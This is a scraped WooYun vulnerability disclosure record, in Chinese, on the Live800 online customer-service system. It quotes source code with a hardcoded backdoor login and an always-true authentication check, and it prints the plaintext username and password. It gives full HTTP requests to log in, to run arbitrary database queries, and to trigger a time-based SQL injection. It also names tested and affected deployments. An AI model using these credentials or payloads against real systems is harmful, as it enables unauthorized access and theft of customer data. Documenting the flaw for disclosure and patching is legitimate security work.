{"id": 86871, "wybug_id": "wooyun-2016-0177183", "wybug_title": "Live800在线客服系统默认密码导致的SQL查询/SQL注射漏洞", "wybug_corp": "live800.com", "wybug_author": "applychen", "wybug_date": "2016-02-20 01:37", "wybug_open_date": "2016-05-20 08:40", "wybug_type": "默认配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-23：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-20：\t细节向公众公开  简要描述： Live800在线客服系统默认密码导致的SQL查询/SQL注射漏洞 详细说明：  在console/console.jsp文件中硬编码了验证权限的账户密码，通过登录console能够创建公司、修改客服密码，执行select查询以及SQL注射等高风险漏洞：\nif (request.getParameter(\"iamkevin\") == null) {\t\t\tif (session.getAttribute(\"login\") == null) {\t\t\t\t//response.sendRedirect(\"../noContent.jsp\");\t\t\t\t//return;\t\t\t}\t\t} else {\t\t\tif (!\"c36a65c325f7a663fa32cb7bb3d07986\".equals(WestPayMd5\t\t\t\t\t.getMD5Encode(request.getParameter(\"iamkevin\")))) {\t\t\t\t//response.sendRedirect(\"../noContent.jsp\");\t\t\t\t//return;\t\t\t}\t\t}\t\tString companyId = request.getParameter(\"companyId\");\t\tif (companyId == null) {\t\t\tcompanyId = (String) session.getAttribute(\"configCompanyId\");\t\t\tif (companyId == null) {\t\t\t\tcompanyId = \"\";\t\t\t}\t\t}\t\tcompanyId = URLUtil.escapeHtml(companyId);\t\t//password=QQ密码+身份证后4位\t\tif (session.getId().equals(request.getParameter(\"login\"))) {\t\t\tif (true||\"9d5e3ecdeb4cdb7acfd63075ae046672\".equals(WestPayMd5\t\t\t\t\t.getMD5Encode(request.getParameter(\"userName\")))\t\t\t\t\t&& \"5c7c90afbf1c7395501c64e6e8daac42\"\t\t\t\t\t\t\t.equals(WestPayMd5.getMD5Encode(request\t\t\t\t\t\t\t\t\t.getParameter(\"password\")))\t\t\t\t\t&& !StringUtils.isNullOrLengthZero(companyId)) {\t\t\t\tsession.setAttribute(\"login\", \"true\");\t\t\t\tsession.setAttribute(\"kevinpassword\", WestPayMd5\t\t\t\t\t\t.getMD5Encode(request.getParameter(\"password\")));\t\t\t\tsession.setAttribute(\"configCompanyId\", companyId);\t\t\t\tresponse.sendRedirect(\"main.jsp\");\t\t\t}\t\t}\n一共从request中获取5个参数iamkevin、companyId、login、userName、password。其中iamkevin不等于null，companyId为任意值，login为当前setcookie中的sessionid，username为kevin，password为wuTAO198403242337。以华为为例（**.**.**.**）进行测试，首先访问：\nhttp://**.**.**.**/live800/console/console.jsp\n在返回中获得JSESSIONID：\n\n这里是15B8A8CBD0D5D037CBAF752BD6361D3C然后构造登录包：\nPOST /live800/console/console.jsp?login=15B8A8CBD0D5D037CBAF752BD6361D3C HTTP/1.1Host: **.**.**.**Cookie: JSESSIONID=15B8A8CBD0D5D037CBAF752BD6361D3CContent-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 75iamkevin=wuxiaohong&companyId=123&userName=kevin&password=wuTAO198403242337\n登录成功后302到main.jsp：\n\n\n\n首先查看配置信息：\nGET /live800/console/showConfig.jsp HTTP/1.1Host: **.**.**.**Cookie: JSESSIONID=15B8A8CBD0D5D037CBAF752BD6361D3CConnection: keep-alive\n\n\n得到jndi：\njdbc/live800_im_crmjdbc/live800_im_analysejdbc/live800_im_ipjdbc/live800_im\n然后在dbcheck.jsp中使用jndi执行select的查询语句：\nPOST /live800/console/dbCheck.jsp HTTP/1.1Host: **.**.**.**Cookie: JSESSIONID=15B8A8CBD0D5D037CBAF752BD6361D3CContent-Type: application/x-www-form-urlencodedContent-Length: 111userName=kevin&userPassword=wuTAO198403242337&isQuery=1&dbType=self&jndi=jdbc/live800_im_crm&t=select version()\n\n\n\n\n\n\n如果这里使用jndi没办法查询的话还有一处SQL注射在console/expireTimeAction.jsp中：\nString companyId = (String) session.getAttribute(\"configCompanyId\");\tif (StringUtils.isNullOrLengthZero(companyId)) {\t\tresponse.sendRedirect(\"../noContent.jsp\");\t\treturn;\t}\tString expireTime = request.getParameter(\"expireTime\");//延期时间\tif (StringUtils.isNullOrLengthZero(expireTime)) {\t\tresponse.sendRedirect(\"expireTime.jsp?e=\"\t\t\t\t+ URLUtil.enCode(\"请输入延期时间！\"));\t\treturn;\t}\tString accountId = request.getParameter(\"accountId\");//延期时间\tif (StringUtils.isNullOrLengthZero(expireTime)) {\t\tresponse.sendRedirect(\"expireTime.jsp?e=\"\t\t\t\t+ URLUtil.enCode(\"发生异常，没有帐号ID！\"));\t\treturn;\t}\ttry{\t\tInteger.parseInt(accountId);\t}catch(Exception e){\t\tresponse.sendRedirect(\"expireTime.jsp?e=\"\t\t\t\t+ URLUtil.enCode(\"发生异常，没有帐号ID！\"));\t\treturn;\t}\t//update operator_account set expire_time = '2013-07-31 00:00:00';\t//;\tString accountSql=\"update operator_account set expire_time = '\"+expireTime+\" 00:00:00' where company_id=\"+companyId+\" and account_id=\"+accountId;\tif(DBCommuter.update(accountSql)){\t\tString companySql =\"update company set account_type=3 where company_id=\"+companyId;\t\tif(DBCommuter.update(companySql)){\t\t\tresponse.sendRedirect(\"expireTime.jsp?e=\"\t\t\t\t\t+ URLUtil.enCode(\"操作成功!\"));\t\t}else{\t\t\tresponse.sendRedirect(\"expireTime.jsp?e=\"\t\t\t\t\t+ URLUtil.enCode(\"操作失败!\"));\t\t}\n直接从request中获取到expireTime的值进入SQL查询中，导致SQL注射发生：\nGET /live800/console/expireTimeAction.jsp?expireTime=123'and%20sleep(8)%23&accountId=12345678& HTTP/1.1Host: **.**.**.**Cookie: JSESSIONID=15B8A8CBD0D5D037CBAF752BD6361D3C;;companyId=123Content-Type: application/x-www-form-urlencodedContent-Length: 108\n在登录后通过SQL通用能够查询出数据库内容，前文http://**.**.**.**/bugs/wooyun-2015-0147511写过这里就不再赘述了。列几个受影响的站：\nhttp://**.**.**.**/live800/console/console.jsphttp://**.**.**.**/live800/console/console.jsphttp://**.**.**.**/live800/console/console.jsphttp://**.**.**.**/console/console.jsphttp://**.**.**.**/live800/console/console.jsphttp://**.**.**.**/live800/console/console.jsphttp://**.**.**.**/live800/console/console.jsp\n   漏洞证明：  同上   修复方案：  验证的账户或密码应当提示用户自行设置   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-02-20 08:39 厂商回复： 非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-20 01:46 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:60        | 新手上路。)\t\t \n  大牛，这么晚还不睡    \n     2016-02-20 11:18 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  @幻老头儿 0.0你不知道今天是属于周末的嘛？    \n     2016-02-20 11:34 |    \t\tapplychen  \t\t\t( 普通白帽子  |\t\t\t        Rank:629 漏洞数:54        | 万古漫漫长如夜)\t\t \n  一般都是半夜发漏洞……    \n     2016-02-20 12:09 |    \t\t’‘Nome \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:31        | 有事请发邮件，2859857@gmail.com，垃圾邮...)\t\t \n  @applychen 求细节额，哥们加个好友    \n     2016-02-23 22:30 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  @applychen  live800终极杀手！    \n     2016-02-24 17:57 |    \t\t随风漫步 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        )\t\t \n  @狗狗侠 大侠，漏洞补充完毕了，求审核啊。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}